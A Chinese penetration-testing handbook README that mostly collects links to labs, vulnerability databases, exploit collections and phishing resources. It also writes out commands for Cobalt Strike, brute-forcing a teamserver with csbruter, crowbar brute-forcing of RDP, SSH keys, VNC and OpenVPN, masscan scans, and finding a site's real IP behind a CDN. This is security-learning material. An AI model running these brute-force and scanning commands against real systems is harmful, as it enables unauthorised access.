# Power-PenTest🕶

`不高兴的渗透手册`

<p align="center">
     <a href="https://www.iqiyi.com/lib/m_200034814.html"><img src="../../assets/img/pentest.jpg"></a>
</p>

---

## 免责声明

`本人撰写的手册,仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关。`

---

## 大纲
```markdown
1. 教程资源
    - 靶机
    - 思维简图
    - 漏洞库
2. 瑞士军刀/安全工具/框架
    - cobaltstrike
    - Empire
    - metasploit
    - 抓包改包
        - Burp Suite
        - wireshark
    - exp/poc/tool 合集
3. Misc
    - APT
        - 社工
    - 各种爆破
        - 服务-端口爆破
    - SRC/众测收集
4. RedTeam
    - 权限维持/反侦察
        - 通用/BypassAV
        - 隐匿攻击
        - C2
        - web
    - 信息收集
        - 漏洞
            - web 漏扫
            - 综合漏洞
        - 搜索引擎 Hacking
        - 网络/主机
            - IP 扫
            - 端口扫
        - 网站
            - CDN/查源 IP
            - DNS 枚举
            - 目录枚举
            - 指纹
            - 旁站
            - whois/备案
        - 另类
            - 截图
    - LAN
        - 中间人
    - WAN
        - DDOS
    - windows 渗透
        - Exchange
        - RDP
        - 口令获取及破解
        - 域渗透
    - web 渗透
        - 常见漏洞
        - 逻辑类
        - Fuzz
    - windows 渗透
        - Exchange
        - RDP
        - 口令获取及破解
        - 域渗透
    - web 渗透
        - 常见漏洞
			- 任意文件下载/读取
			- 文件包含漏洞
			- 文件解析漏洞
			- 文件上传漏洞
			- 信息泄露漏洞
			- CSRF
			- http 参数污染
			- php 反序列化
			- SSRF
			- URL 跳转漏洞
        - 逻辑类
        - Fuzz
			- 字典
			- 暴力破解
			- SQL
			- XSS
			- XEE
		- 安防设备
			- WAF
	- OS vul
		- IOS VUL
		- Linux vul
		- Windows vul
	- Web vul
		- 各类论坛/CMS/框架
		- 中间件/服务
		- 业务/软件类 vul
		- 业务/协议类 vul
	- 云渗透
		- aws
5. BlueTeam
	- 事件响应
		- 操作系统取证
		- 内存取证
		- 文件取证
		- 应急处置
	- 运维保障
		- 基线
		- 系统安全
		- 应用安全
6. 工控/IoT/物理
    - CPU
	- 射频/无线
	- 物联网设备
		- Printer
		- Router/Switch
	- USB HACKER
```

---

# 教程资源
## 靶机
### [DVWA](https://github.com/ethicalhack3r/DVWA) 入门靶场

**通关笔记**
- [DVWA 小记](./实验/DVWA小记.md)

### [pikachu](https://github.com/zhuifengshaonianhanlu/pikachu) 入门靶场

**通关笔记**
- [pikachu 小记](./实验/pikachu小记.md)

### [VulnHub](https://www.vulnhub.com/)
**[Kioptrix: Level 1.3 (#4)](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/)** 模拟实战环境的靶场
- **通关笔记**
    - [Kioptrix4 通关笔记](./实验/Kioptrix4通关笔记.md)

---

## 思维简图
- [phith0n/Mind-Map: 各种安全相关思维导图整理收集](https://github.com/phith0n/Mind-Map)
- [SecWiki/sec-chart: 安全思维导图集合](https://github.com/SecWiki/sec-chart)

---

## 漏洞库
- [Exploits Database by Offensive Security](https://www.exploit-db.com/)
- [全球最新漏洞库 - 安全客，安全资讯平台](https://www.anquanke.com/vul?page=1)
- [CVE - Common Vulnerabilities and Exposures (CVE)](https://cve.mitre.org/index.html)
- [CVE中文漏洞信息库 - SCAP中文社区](http://cve.scap.org.cn/)
- [CVSS v3.0 Specification Document](https://www.first.org/cvss/specification-document)
- [CWE - Common Weakness Enumeration](http://cwe.mitre.org/index.html)
- [CXSECURITY.COM Free Security List](https://cxsecurity.com/)
- [ICS-CERT Advisories | ICS-CERT](https://ics-cert.us-cert.gov/advisories)
- [NSFOCUS绿盟科技](http://www.nsfocus.net/index.php)
- [NVD - Home](https://nvd.nist.gov/)
- [漏洞时代 - 最新漏洞_0DaY5.CoM - 0DaY5.CoM](http://0day5.com/)
- [SecuriTeam.com - A Free Accurate and Independent Source of Vulnerability Information](http://www.securiteam.com/)
- [VULNERABILITY LAB - SECURITY VULNERABILITY RESEARCH LABORATORY - Best Bug Bounty Programs, Vulnerability Coordination and Bug Bounty Platform - INDEX](https://www.vulnerability-lab.com/)
- [国家信息安全漏洞库](http://www.cnnvd.org.cn/)
- [知道创宇 Seebug 漏洞平台 - 洞悉漏洞，让你掌握第一手漏洞情报！](https://www.seebug.org/)
- [💀 Sploitus | Exploit & Hacktool Search Engine](https://sploitus.com/)
- [SecurityFocus](https://www.securityfocus.com/)
- [CVE security vulnerability database. Security vulnerabilities, exploits, references and more](https://www.cvedetails.com/)
- [Shodan Exploits](https://exploits.shodan.io/welcome)
- [0day.today 1337day Inj3ct0r 漏洞数据库](https://cn.0day.today/)
- [exp库-打造中文最大exploit库](http://www.expku.com/)

---

# 瑞士军刀/安全工具/框架
## cobaltstrike

**使用**
- 服务端

    `./teamserver <你的IP> <你的密码>`

- 客户端

    `java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar`

    或

    `javaw -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar`

**文章**
- [cobalt strike 快速上手 [ 一 ] - FreeBuf专栏·攻防之路](https://www.freebuf.com/column/149236.html)
- [教你修改cobalt strike的50050端口 - 3HACK](https://www.3hack.com/note/96.html)
- [ryanohoro/csbruter: Cobalt Strike team server password brute force tool](https://github.com/ryanohoro/csbruter)

**爆破 cobaltstrike teamserver**
```bash
git clone https://github.com/ryanohoro/csbruter
cd csbruter
cat wordlist.txt | python3 csbruter.py xxx.xxx.xxx.xxx
```

---

## [Empire](https://github.com/EmpireProject/Empire)

**文章/相关**
- [【技术分享】一篇文章精通PowerShell Empire 2.3(上)](https://www.anquanke.com/post/id/87328)
- [【技术分享】一篇文章精通PowerShell Empire 2.3(下)](https://www.anquanke.com/post/id/87333)

**图形化 UI**
- [leeberg/BlueCommand](https://github.com/leeberg/BlueCommand)

---

## metasploit

**用法总结**
- [metasploit 小记](./工具/metasploit小记.md)

**文章/相关**
- [MSF基础命令新手指南](https://www.jianshu.com/p/77ffbfc3a06c)
- [【渗透神器系列】Metasploit](https://thief.one/2017/08/01/1/)
- [给kali的Metasploit下添加一个新的exploit](https://blog.csdn.net/SilverMagic/article/details/40978081)
- [linux - Metasploit: Module database cache not built yet, using slow search](https://serverfault.com/questions/761672/metasploit-module-database-cache-not-built-yet-using-slow-search)
- [Nightly Installers](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)

**Module database cache not built yet, using slow search**
```bash
service postgresql start
msfdb init
db_rebuild_cache
```

**图形化 UI**
- [WayzDev/Kage](https://github.com/WayzDev/Kage)

---

## 抓包改包
### [Burp Suite](https://portswigger.net/)

**用法总结**
- [burp 小记](./工具/burp小记.md)

**资源**
- [Mr-xn/BurpSuite-collections](https://github.com/Mr-xn/BurpSuite-collections)

**书**
- [Burp Suite 实战指南](https://t0data.gitbooks.io/burpsuite/content/)

**tips**

Firefox `about:config` 里 `network.captive-portal-service.enabled` 设置成 `false` ,可以关闭火狐向 `http://detectportal.firefox.com/` 发包

**插件**

> 使用堆栈跟踪进行 Java 指纹识别
- [x41sec/BeanStack](https://github.com/x41sec/beanstack)

> 分块传输辅助插件,用于分块传输绕 WAF
- [c0ny1/chunked-coding-converter](https://github.com/c0ny1/chunked-coding-converter)

> 顾名思义，这是 burp 中的 hackbar
- [d3vilbug/HackBar](https://github.com/d3vilbug/HackBar)

> 添加一些右键菜单让 burp 用起来更顺畅
- [bit4woo/knife](https://github.com/bit4woo/knife)

> 利用 burp 收集整个企业、组织的域名（不仅仅是单个主域名）的插件
- [bit4woo/domain_hunter](https://github.com/bit4woo/domain_hunter)

> 捕捉由 Burp 发出的 payloads 触发的目标与外部系统发生数据交互行为
- [hackvertor/taborator](https://github.com/hackvertor/taborator)
- [NetSPI/BurpCollaboratorDNSTunnel](https://github.com/NetSPI/BurpCollaboratorDNSTunnel)
- [Gaining persistent access to Burp Suite's Collaborator sessions - a step-by-step guide](https://www.onsecurity.co.uk/blog/gaining-persistent-access-to-burps-collaborator-sessions)

> burpsuite 的日志插件，不过是增强版本
- [nccgroup/BurpSuiteLoggerPlusPlus](https://github.com/nccgroup/BurpSuiteLoggerPlusPlus)

> Hackvertor 构造绕过 waf 的 payload 并破解 XOR 加密
- 商店有
- [利用burp插件Hackvertor绕过waf并破解XOR加密](https://www.4hou.com/tools/14353.html)

> 使用 phantomjs 调用前端加密函数对数据进行加密，方便对加密数据输入点进行 fuzz。
- [c0ny1/jsEncrypter](https://github.com/c0ny1/jsEncrypter)

> Authz 快速探测越权
- 商店有
- [wuntee/BurpAuthzPlugin](https://github.com/wuntee/BurpAuthzPlugin)
- [基于BurpSuite快速探测越权-Authz插件](https://gh0st.cn/archives/2019-06-27/1)

> 高速 Intruder 插件
- 商店有
- [PortSwigger/turbo-intruder](https://github.com/portswigger/turbo-intruder)
- [Turbo Intruder：BurpSuite高速 Intruder 插件介绍](https://www.freebuf.com/sectool/195912.html)

> 从 js 文件中提取隐藏的路径并对其进行美化以便进一步阅读
- [Lopseg/Jsdir](https://github.com/Lopseg/Jsdir)

> 一个 Burp 插件，实现用 AES 算法透明加密原版菜刀 Caidao.exe 与服务器端交互的 http 数据流
- [ekgg/Caidao-AES-Version](https://github.com/ekgg/Caidao-AES-Version)

> HTTP Desync Attacks 辅助工具
- [PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)

---

### [wireshark](https://www.wireshark.org/)

**样本**
- [SpiderLabs/IOCs-IDPS](https://github.com/SpiderLabs/IOCs-IDPS)

**在线分析**
- [NetworkTotal - Free Online Network Traffic Scanner](https://www.networktotal.com/index.html)

**过滤语法**

```bash
http.request.method == "POST"   # POST 请求
tcp contains "http" # 显示 payload 中包括"http"字符串的 tcp 封包。
http.request.uri contains "online" # 显示请求的 uri 包括"online"的 http 封包。
ip.addr == 1.1.1.1  # IP 为 1.1.1.1 的流量
```

---

## exp/poc/tool 合集

- [Kali Linux Tools Listing | Penetration Testing Tools](https://tools.kali.org/tools-listing)
- [信息安全工具汇总 - WLGF,网络攻防小组](http://www.nsoad.com/Security-tools/20180730/tools-1217.html)
- [rootphantomer/exp: 收集各种各样的exp](https://github.com/rootphantomer/exp)
- [Jack-Liang/kalitools: Kali Linux工具清单](https://github.com/Jack-Liang/kalitools)
- [k8gege/K8tools: K8工具合集](https://github.com/k8gege/K8tools)
- [WangYihang/Exploit-Framework](https://github.com/WangYihang/Exploit-Framework)
- [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [csirt/CVEsPoCs](https://github.com/Spacial/csirt/blob/master/CVEsPoCs.md)
- [wudimahua/Firewall](https://github.com/wudimahua/Firewall)
- [nanshihui/PocCollect](https://github.com/nanshihui/PocCollect)
- [hanc00l/some_pocsuite](https://github.com/hanc00l/some_pocsuite)
- [foospidy/web-cve-tests](https://github.com/foospidy/web-cve-tests)
- [cckuailong/PocCollect](https://github.com/cckuailong/PocCollect)
- [ptresearch/AttackDetection](https://github.com/ptresearch/AttackDetection)
- [Penetration Testing Tools Cheat Sheet](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/)
- [Mr-xn/hackbar2.1.3](https://github.com/Mr-xn/hackbar2.1.3)

---

# Misc
## APT

**文章**
- [APT攻击:模拟一次网络战过程](https://www.anquanke.com/post/id/103265)
- [毒云藤（APT-C-01）军政情报刺探者揭露](http://www.freebuf.com/articles/system/185155.html)
- [APT10又曝光了,这次是因为?](https://www.secpulse.com/archives/75623.html)
- [疑似朝鲜APT组织发起针对学术界目标的钓鱼攻击](https://www.anquanke.com/post/id/167566)
- [一场精心策划的针对驱动人生公司的定向攻击活动分析](https://www.freebuf.com/articles/system/192194.html)
- [海莲花组织向招聘单位发出应聘请求，并附上简历链接](https://www.freebuf.com/column/194135.html)
- [“毒针”行动 - 针对“俄罗斯总统办所属医疗机构”发起的0day攻击](http://blogs.360.cn/post/PoisonNeedles_CVE-2018-15982.html)
- [被遗漏的0day ? —APT-C-06组织另一网络武器库分析揭秘](http://blogs.360.cn/post/VBScript_vul_CH.html)

**资源**
- [kbandla/APTnotes](https://github.com/kbandla/APTnotes)
- [APTnotes](https://gitee.com/superme/APTnotes)
- [CyberMonitor/APT_CyberCriminal_Campagin_Collections](https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections)
- [blackorbird/APT_REPORT](https://github.com/blackorbird/APT_REPORT)
- [Intrusion Truth – We hunt APTs](https://intrusiontruth.wordpress.com/)
- [Groups - MITRE ATT&CK™](https://attack.mitre.org/groups/)
- [Technique Matrix - Enterprise ATT&CK™](https://attack.mitre.org/matrices/enterprise/)

### 社工
**案例**
- [一个精壮的代购骗子被我彻底征服](https://bbs.ichunqiu.com/thread-37565-1-3.html)
- [看我如何破解xiaoba勒索病毒最新版并社工](https://bbs.ichunqiu.com/thread-29598-1-1.html)
- [【忍无可忍】揭秘一个专门针对学生家长下手的诈骗团伙](https://bbs.ichunqiu.com/thread-46370-1-1.html)
- [一个xss漏洞到内网漫游](https://bbs.ichunqiu.com/thread-46068-1-1.html)
- [从社工考试答案到发现惊天作弊团伙](https://bbs.ichunqiu.com/thread-43205-1-1.html)
- [卧薪尝胆~揭秘新型刷票骗局，击溃骗子的心肝脾肺肾！](https://bbs.ichunqiu.com/thread-43341-1-1.html)
- [对某黑产大佬的一次扒皮](https://bbs.ichunqiu.com/thread-42939-1-1.html)
- [记一次对色情网站拥有人身份的挖掘](https://nosec.org/home/detail/1869.html)
- [这回不定位女友了：火车票上的星号暗藏玄机？！](http://www.freebuf.com/articles/database/143402.html)
- [常见社工方法以及如何防社工](https://bbs.ichunqiu.com/thread-29654-1-21.html)
- [从群体电脑蓝屏到反黑幕后黑手](https://aq.mk/index.php/archives/8/)
- [杨猛 | 世界上最好的在线游戏：追踪杀手，也调查冲突和毒枭](https://mp.weixin.qq.com/s/L_0vAnJtlfL_8rNIIPPAOQ)
- [我被人吞了一部手机，调查后发现对方是淘宝打假人](https://www.secpulse.com/archives/96599.html)
- [“答应我，别做违法事”——我是如何劝色情网站操控者从良的](https://www.secpulse.com/archives/97015.html)
- [QQ申诉那点事](http://www.mottoin.com/detail/2943.html)
- [朋友圈别瞎发照片，指不定跟踪狂就是这样找到你家的](https://www.secpulse.com/archives/98492.html)

**工具集**
- **SET**
    - [SET 小记](./工具/SET小记.md)

**Email**
- **文章**
    - [关于电子邮件诈骗的一些分析](http://www.4hou.com/web/13931.html)

- **工具**
    - [nettitude/Prowl](https://github.com/nettitude/Prowl)

**钓鱼**
- **案例**
    - [指尖博弈——FBI竟建立虚假联邦快递网站](https://www.anquanke.com/post/id/166650)
    - [Cookie Maker：隐藏在Google Docs中的恶意网络](https://www.anquanke.com/post/id/165033)
    - [利用QQ钓鱼或者定位女友是否回家](http://www.freebuf.com/articles/web/140111.html)
    - [QQ定位女友是否回家系列二之定位系统的打造](http://www.freebuf.com/news/141038.html)
    - [利用斯拉夫字母辅助社会工程学攻击思路](https://bbs.ichunqiu.com/thread-46462-1-2.html)

- **工具**
    - [HTTrack - 克隆任意网站](http://topspeedsnail.com/httrack-clone-website/)
    - [Seeker：一款可获取高精度地理和设备信息的工具分析](http://www.freebuf.com/sectool/179641.html)

- **rlo**
    - [RLO文件名欺骗](https://blog.csdn.net/mgxcool/article/details/50637346)
    - [木马逆名欺骗：利用unicode控制符RLO](https://blog.csdn.net/kencaber/article/details/50649606)

- **URL 欺骗**
    - [Phishing with Unicode Domains](https://www.xudongz.com/blog/2017/idn-phishing/)

---

## 各种爆破
### 服务-端口爆破
**工具**
- [galkan/crowbar](https://github.com/galkan/crowbar) - 支持对于 OpenVPN、RDP、SSH、VNC 的爆破，效果不错
    ```
    Brute Forcing RDP:
    ./crowbar.py -b rdp -s 127.0.0.1/24 -u admin -c Aa123456
    ./crowbar.py -b rdp -s 127.0.0.1/24 -U /root/Desktop/userlist -c passw0rd
    ./crowbar.py -b rdp -s 127.0.0.1/24 -u localuser -C /root/Desktop/passlist
    ./crowbar.py -b rdp -s 127.0.0.1/24 -U /root/Desktop/userlist -C /root/Desktop/passlist -d

    Brute Forcing SSH Private Keys:
    ./crowbar.py -b sshkey -s 127.0.0.1/24 -u root -k /root/.ssh/id_rsa

    Brute Forcing VNC
    ./crowbar.py -b vnckey -s 127.0.0.1/24 -p 5902 -k /root/.vnc/passwd

    Brute Forcing OpenVPN
    ./crowbar.py -b openvpn -s 127.0.0.1/24 -p 443 -m /root/Desktop/vpnbook.ovpn -k /root/Desktop/vpnbook_ca.crt -u vpnbook -c cr2hudaF
    ```
- [shack2/SNETCracker](https://github.com/shack2/SNETCracker) - 一款 Windows 平台的弱口令审计工具，支持批量多线程检查。
- [vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra) - hydra 不多说了
- [foryujian/yujianrdpcrack](https://github.com/foryujian/yujianrdpcrack) - 御剑RDP爆破工具 - 效果一般

### 文件爆破
鸽

---

## SRC/众测收集
**通用**
- [先知安全服务平台](https://xianzhi.aliyun.com/)
- [漏洞盒子 | 互联网安全测试众测平台](https://www.vulbox.com/)
- [补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC](https://www.butian.net/)
- [Bug Bounty - Hacker Powered Security Testing | HackerOne](https://www.hackerone.com/)
- [Bugcrowd – Vulnerability Disclosure & Bug Bounty Programs](https://www.bugcrowd.com/)
- [First European Bug Bounty platform | bountyfactory.io](https://bountyfactory.io/en/index.html)
- [Zero Day Initiative | Home](https://www.zerodayinitiative.com/)
- [ZERODIUM - The Premium Exploit Acquisition Platform](https://zerodium.com/)
- [国家信息安全漏洞共享平台](http://www.cnvd.org.cn/)
- [DVP去中心化漏洞平台-专注区块链生态安全](https://dvpnet.io/)
- [教育行业漏洞报告平台](https://src.edu-info.edu.cn/)
- [Open Bug Bounty | Free Bug Bounty Program & Coordinated Vulnerability Disclosure](https://www.openbugbounty.org/)

**公司**
- [蚂蚁金服安全应急响应中心官网 - AFSRC](https://security.alipay.com/)
- [阿里安全响应中心](https://security.alibaba.com/)
- [字节跳动安全中心](https://security.bytedance.com/index/)
- [腾讯安全应急响应中心](https://security.tencent.com/)
- [Xiaomi Security Center](https://sec.xiaomi.com/)
- [爱奇艺安全应急响应中心](https://security.iqiyi.com/)
- [哔哩哔哩安全应急响应中心](https://security.bilibili.com/)
- [菜鸟安全应急响应中心](https://sec.cainiao.com/)
- [点融网安全应急响应中心](https://security.dianrong.com/)
- [百度安全应急响应中心](http://sec.baidu.com/views/main/index.html#home)
- [饿了吗 ASRC | 阿里本地生活安全响应中心](https://security.ele.me/)
- [东方财富安全应急响应中心](https://security.eastmoney.com/)
- [滴滴出行安全应急响应中心](http://sec.didichuxing.com/)
- [富友安全应急响应中心](https://fsrc.fuiou.com/home/index.html)
- [瓜子安全应急响应中心](https://security.guazi.com/home)
- [好未来安全应急响应中心](http://src.100tal.com/)
- [焦点安全应急响应中心](https://security.focuschina.com/)
- [京东安全应急响应中心](https://security.jd.com/#/)
- [竞技世界安全应急响应中心](https://security.jj.cn/)
- [金山安全应急响应中心](http://sec.kingsoft.com/)
- [快手安全应急响应中心](https://security.kuaishou.com/#/)
- [美丽联合集团安全应急响应中心](https://security.mogu.com/#/)
- [美团安全应急响应中心](https://security.meituan.com/#/home)
- [魅族安全中心](https://sec.meizu.com/)
- [Mobike安全响应中心](https://security.mobike.com/)
- [搜狗安全应急响应中心](http://sec.sogou.com/)
- [同程艺龙安全应急响应中心](https://sec.ly.com/)
- [途牛安全应急响应中心](https://sec.tuniu.com/)
- [苏宁安全应急响应中心](https://security.suning.com/ssrc-web/index.jsp)
- [VIPKID安全应急响应中心](https://security.vipkid.com.cn/)
- [挖财安全应急响应中心](https://sec.wacai.com/)
- [应急响应 - 网易安全中心](https://aq.163.com/module/hole/hole-submit.html)
- [WDSRC - 微贷安全应急响应中心](https://sec.weidai.com.cn/)
- [微博安全应急响应中心](https://wsrc.weibo.com/)
- [完美世界安全应急响应中心](http://security.wanmei.com/)
- [VSRC首页-唯品会信息安全中心](https://sec.vip.com/)
- [微众安全响应中心](https://security.webank.com/)
- [WIFI万能钥匙安全响应中心](https://sec.wifi.com/)
- [携程安全应急响应中心](https://sec.ctrip.com/)
- [58安全应急响应中心](https://security.58.com/)
- [陌陌安全应急响应中心](https://security.immomo.com/)
- [平安集团安全应急响应中心](https://security.pingan.com/)
- [千米电商云安全应急响应中心](http://security.qianmi.com/)
- [融360安全应急响应中心](https://security.rong360.com/#/)
- [去哪儿安全应急响应中心](http://security.qunar.com/)
- [新浪安全应急响应中心](http://sec.sina.com.cn/)
- [宜人贷安全应急响应中心](https://security.yirendai.com/)
- [中通安全应急响应中心（ZSRC）](https://sec.zto.com/home)
- [智联招聘应急响应中心](https://src.zhaopin.com/#/)
- [宜信安全应急响应中心](http://security.creditease.cn/)
- [猪八戒网安全响应中心](https://security.zbj.com/)
- [顺丰安全应急响应中心](http://sfsrc.sf-express.com/index)

**文章**
- [那些年挖过的SRC之我是捡漏王](https://www.freebuf.com/vuls/198327.html)
- [DC0531-SRC](./教程/DC0531-SRC.pdf)

---

# RedTeam
## 权限维持/反侦察
**笔记**
- [权限维持与反侦察笔记](./笔记/权限维持与反侦察笔记.md)

---

## 信息收集
### 漏洞
#### web 漏扫

**漏扫靶机**
- http://testphp.vulnweb.com/
- http://testfire.net/

**[AWVS-acunetix](https://www.acunetix.com/vulnerability-scanner/)** - 存在被人反打一波的操作，请小心谨慎
- 文章
    - [编写AWVS脚本探测web services](http://gv7.me/articles/2017/Writing-AWVS-scripts-to-detect-Web-Services/)
    - [论如何反击用AWVS的黑客](https://www.freebuf.com/news/136476.html)

- 解密脚本
    - [fnmsd/awvs_script_decode](https://github.com/fnmsd/awvs_script_decode)

**[chaitin/xray](https://github.com/chaitin/xray) - 长亭的洞鉴漏扫社区版,效果不错**

```
xray webscan --listen 127.0.0.1:7777 --html-output proxy.html
```

**[al0ne/Vxscan](https://github.com/al0ne/Vxscan) - python3写的综合扫描工具，主要用来敏感文件探测** - 没怎么用过，不多做评价

**nikto** - 效果一般

`nikto -host http://xxx.xxx.xxx.xx:8080/`

#### 综合漏扫

**[Nessus](https://www.tenable.com/downloads/nessus)** - 效果不错，价格喜人
- 报告翻译
    - [FunnyKun/NessusReportInChinese](https://github.com/FunnyKun/NessusReportInChinese)
    - [Bypass007/Nessus_to_report](https://github.com/Bypass007/Nessus_to_report)

**[ysrc/xunfeng](https://github.com/ysrc/xunfeng)** - 国内网络环境安装有点麻烦，不过效果不错。

---

### 搜索引擎 Hacking

**笔记**
- [搜索引擎 Hacking 笔记](./笔记/搜索引擎Hacking笔记.md)

---

### 网络/主机

**TTL 来判断目的主机的操作系统类型**

下面是默认操作系统的 TTL：
```bash
1、WINDOWS NT/2000   TTL：128
2、WINDOWS 95/98     TTL：32
3、UNIX              TTL：255
4、LINUX             TTL：64
5、WIN7              TTL：64
```

**修改本机电脑上面的默认 TTL 值**

通过修改本机上的 TTL 值可以混淆攻击者的判断(当然,很少有用户会这么做)。TTL 值在注册表的位置是：`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters `其中有个 DefaultTTL 的 DWORD 值,其数据就是默认的 TTL 值了,我们可以修改 DefaultTTL 里面的 TTL 默认值,但不能大于十进制的 255。

#### IP 扫

**工具**
- **[alexxy/netdiscover: netdiscover](https://github.com/alexxy/netdiscover)**

    `netdiscover -r 1.1.1.0/24`

- [nbtscan - NETBIOS nameserver scanner](http://unixwiz.net/tools/nbtscan.html)

- nmap

    `nmap -sP <网段>/24`

#### MAC 扫

**工具**
- [科来MAC地址扫描器](http://www.colasoft.com.cn/download/capsa_tool_cmac.php)

#### 端口扫

**tips**
```
1. 有时候扫描主机会碰到显示大量开放端口,这种可能都是虚的，是 waf 在起作用。
2. nmap 在有些场景下不一定能把所有开放端口扫出，这时候换一个工具说不定有奇效。
```

**端口信息**
- [Service Name and Transport Protocol Port Number Registry](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml)
- 端口列表文件 [md](./文件/端口列表.md)、[xlsx](./文件/端口列表.xlsx)
- 常见端口渗透 [png](./文件/常见端口渗透.png)

**工具**
- **[nmap](https://nmap.org/download.html)**
    - **笔记**
        - [nmap 小记](./工具/nmap小记.md)

    - **zenmap**
        - [Zenmap - 跨平台的GUI版nmap bug较多，不宜使用](https://nmap.org/zenmap/)

    - **脚本**
        - [smb-enum-users](https://nmap.org/nsedoc/scripts/smb-enum-users.html)

    - **报告模板**
        - [honze-net/nmap-bootstrap-xsl](https://github.com/honze-net/nmap-bootstrap-xsl)

    - **文章**
        - [【渗透神器系列】nmap](https://thief.one/2017/05/02/1/)
        - [Nmap扫描原理与用法](https://blog.csdn.net/aspirationflow/article/details/7694274)

- **[masscan](https://github.com/robertdavidgraham/masscan)**

    ```bash
    # 常用
    masscan 127.0.0.0/24 -p20,21,22,23,80,161,443,873,2181,3389,6379,7001,8000,8009,8080,9000,9009,9090,9200,9300,10000,50070 > results.txt

    # 单端口扫描
    Masscan 127.0.0.0/24 -p443

    # 多端口扫描 扫描80或443端口的B类子网
    Masscan 127.0.0.0/24 -p80,443

    # 扫描一系列端口 扫描22到25端口的B类子网
    Masscan 127.0.0.0/24 -p22-25

    # 快速扫描
    Masscan 127.0.0.0/24 --top-ports 100 -rate 100000

    # 排除目标
    Masscan 127.0.0.0/24 --top-ports 100 --excludefile exclude.txt

    # 结果保存
    Masscan 127.0.0.0/24 --top-ports 100 > results.txt
    ```

- **msf**
    ```bash
    set scanner/portscan/tcp
    set rhosts <ip/CIDR>
    set ports <port>
    set THREADS <s>
    set TIMEOUT <s>
    run
    ```

---

### 网站
#### CDN/查源 IP
**文章**
- [绕过CDN查找网站真实IP](https://xiaix.me/rao-guo-cdncha-zhao-wang-zhan-zhen-shi-ip/)
- [绕过cdn，查找真实IP | 冰羽の博客](https://www.bingyublog.com/2018/03/25/%E7%BB%95%E8%BF%87cdn%EF%BC%8C%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP/)
- [聊聊CDN的误区 - r34l!ty - 不负勇往](http://rinige.com/index.php/archives/772/)
- [网站真实IP发现手段浅谈 - 安全客，安全资讯平台](https://www.anquanke.com/post/id/163348)
- [如何寻找隐藏在CloudFlare或TOR背后的真实原始IP - 嘶吼 RoarTalk](https://www.4hou.com/technology/13713.html)
- [CloudFlair: Bypassing Cloudflare using Internet-wide scan data](https://blog.christophetd.fr/bypassing-cloudflare-using-internet-wide-scan-data/)

**tips**
- Nslookup

    `nslookup + 域名`

- 多地ping域名

    利用在线网站服务多地 ping 测试
    - [CDN Finder tool - CDN Planet](https://www.cdnplanet.com/tools/cdnfinder/)
    - [CDN检测](https://myssl.com/cdn_check.html)
    - [多个地点Ping服务器,网站测速 - 站长工具](http://ping.chinaz.com/)
    - [网站测速工具_超级ping _多地点ping检测 - 爱站网](https://ping.aizhan.com/)
    - [just-ping › Ping an internet host from 50 locations worldwide - iTools](http://itools.com/tool/just-ping)

- "常识"判断

    在反查网站 ip 时,如果此网站有 1000 多个不同域名,那么这个 ip 多半不是真实 ip。

    如果一个 asp 或者 asp.net 网站返回的头字段的 server 不是 IIS、而是 Nginx,那么多半是用了 nginx 反向代理,而不是真实 ip。

    如果 ip 定位是在常见 cdn 服务商的服务器上,那么是真实 ip 的可能性就微乎其微了。

- 子域名查找

    利用一些在线查询的网站，例如 https://dnsdb.io/zh-cn/ 只需输入 baidu.com type:A 就能收集百度的子域名和 ip

    Google 搜索 Google site:baidu.com -www 就能查看除 www 外的子域名

    总结：收集子域名后尝试以解析 ip 不在 CDN 上的 ip 解析主站,真实 ip 成功被获取到。

- 历史 DNS 解析记录

    通过查询历史的 DNS 解析 IP,有可能得到真实 IP
    - https://x.threatbook.cn/nodev4/vb4/list
    - https://viewdns.info/iphistory/
    - https://securitytrails.com/

- SSL 证书
    - [christophetd/CloudFlair](https://github.com/christophetd/CloudFlair)

- LTM 解码法

    当服务器使用 F5 LTM 做负载均衡时，通过对 set-cookie 关键字的解码真实 ip 也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即 487098378 取出来，然后将其转为十六进制数 1d08880a，接着从后至前，以此取四位数出来，也就是 0a.88.08.1d，最后依次把他们转为十进制数 10.136.8.29，也就是最后的真实 ip。

#### DNS 枚举

**工具**
- [shmilylty/OneForAll](https://github.com/shmilylty/OneForAll) - 非常优秀的子域名爆破工具，推荐
- [OWASP/Amass](https://github.com/OWASP/Amass)
- [lijiejie/subDomainsBrute](https://github.com/lijiejie/subDomainsBrute)
- [bit4woo/teemo](https://github.com/bit4woo/Teemo)
- [ring04h/wydomain](https://github.com/ring04h/wydomain)
- [bitquark/dnspop](https://github.com/bitquark/dnspop)
- [fwaeytens/dnsenum](https://github.com/fwaeytens/dnsenum)
- [mschwager/fierce](https://github.com/mschwager/fierce)

**tips**

`这里内容基于 PwnDog 在 DC0531 的议题中的概括` 相应 [pdf](./教程/DC0531-SRC.pdf)

1. 基于SSL证书查询

    - https://censys.io/
    - https://crt.sh/
    - https://certdb.com/

2. 第三方网站接口查询

    - riskiq
    - shodan
    - findsubdomains
    - censys.io
    - dnsdb.io

3. 从代码托管网站或在线服务商查询

    - github.com

4. 通过子域枚举

    - http://z.zcjun.com/

#### 目录枚举

**字典**
- [DictionaryHouse/Dirpath_List](https://github.com/DictionaryHouse/Dirpath_List)

**工具**
- [Xyntax/DirBrute](https://github.com/Xyntax/DirBrute)
- [Nekmo/dirhunt](https://github.com/Nekmo/dirhunt)
